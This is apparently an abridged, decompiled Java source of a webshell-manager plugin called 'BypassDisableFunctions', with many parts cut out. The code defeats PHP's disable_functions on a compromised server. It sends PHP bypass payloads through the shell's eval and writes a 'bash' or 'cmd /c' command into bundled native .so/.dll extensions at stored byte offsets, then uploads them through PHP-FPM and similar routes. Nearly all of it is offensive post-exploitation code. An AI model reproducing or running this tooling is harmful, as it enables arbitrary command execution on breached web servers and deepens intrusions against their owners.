  ...
  implements Plugin
{
  ...
  static {
    EXT_INFO.put("ant_x86_so_start", Integer.valueOf(275));
    EXT_INFO.put("ant_x86_so_end", Integer.valueOf(504));
    EXT_INFO.put("ant_x64_so_start", Integer.valueOf(434));
    EXT_INFO.put("ant_x64_so_end", Integer.valueOf(665));
    EXT_INFO.put("ant_x86_dll_start", Integer.valueOf(1544));
    EXT_INFO.put("ant_x86_dll_end", Integer.valueOf(1683));
    EXT_INFO.put("ant_x64_dll_start", Integer.valueOf(1552));
    EXT_INFO.put("ant_x64_dll_end", Integer.valueOf(1691));
  }
  ...
  public BypassDisableFunctions() {
    ...
    this.envBypassPanel = new JPanel(new BorderLayout());
    this.fpmBypassPanel = new JPanel(new BorderLayout());
    this.amcBypassPanel = new JPanel(new BorderLayout());
    ...
    this.memSplitPane.setBottomComponent(new JScrollPane((Component)this.memResultTextArea));
    ...
    this.envSplitPane.setBottomComponent(new JScrollPane((Component)this.envResultTextArea));
    ...
    this.fpmSplitPane.setBottomComponent(new JScrollPane((Component)this.fpmResultTextArea));
    ...
    this.amcSplitPane.setBottomComponent(new JScrollPane((Component)this.amcResultTextArea));
  ...
  private void memRunButtonClick(ActionEvent actionEvent) {
    ...
    String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", new Object[] { payloadNameString })));
    ...
    if ("php-filter-bypass".equals(payloadNameString)) {
      cmd = String.format("%s > %s", new Object[] { cmd, resultFile });
    }
    
    reqParameter.add("cmd", cmd);
    String resultString = eval(codeString, reqParameter);
  ...
  private void fpmRunButtonClick(ActionEvent actionEvent) throws Exception {
    ...
    reqParameter.add("so", generateExt(generateCmd(cmdFile, resultFile)));
  ...
  private byte[] generateExt(String cmd) throws Exception {
    ...
    int start = ((Integer)EXT_INFO.get(String.format("ant_x%s_%s_start", new Object[] { Integer.valueOf(bits), suffix }))).intValue();
    int end = ((Integer)EXT_INFO.get(String.format("ant_x%s_%s_end", new Object[] { Integer.valueOf(bits), suffix }))).intValue();
    InputStream inputStream = BypassDisableFunctions.class.getResourceAsStream(String.format("assets/ant_x%s.%s", new Object[] { Integer.valueOf(bits), suffix }));
  ...
  private String generateCmd(String cmdFile, String resultFile) {
    if (!this.payload.isWindows()) {
      return "bash " + cmdFile + " > " + resultFile;
    }
    return "cmd /c " + cmdFile + " > " + resultFile;
  }
    ...
    try {
      if (this.phpEvalCode == null) {
        try {
          ...
          GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no find plugin P_Eval_Code!");
          return "";
        } 
      }
  ...
  public void init(ShellEntity shellEntity) {
    ...
    if (this.payload.isWindows()) {
      ...
      for (String payloadName : BYPASS_MEM_PAYLOAD_WINDOWS) {
